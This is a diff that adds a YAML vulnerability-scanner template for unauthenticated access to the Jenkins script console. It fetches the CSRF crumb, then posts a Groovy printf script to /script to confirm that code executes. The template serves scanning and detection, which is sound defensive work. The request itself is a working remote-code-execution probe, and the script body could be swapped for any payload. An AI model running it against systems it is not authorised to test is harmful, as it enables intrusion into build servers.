@@ -1,0 +1,33 @@
+name: yaml-poc-jenkins-jenkins-unauthorized_access-CT-158106
+binding: 8209f74c-c829-4be8-a46e-b59cd40a1f5d
+detail:
+    author: system_user
+    vulnerability:
+        id: cf0336d0-236c-4a31-b1a6-4465bb86bc24
+        level: critical
+transport: http
+set:
+    r1: randomInt(1000, 9999)
+    r2: randomInt(1000, 9999)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /script
+            follow_redirects: false
+        expression: response.status == 200
+        output:
+            search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
+            var: search["var"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /script
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
+expression: r0() && r1()
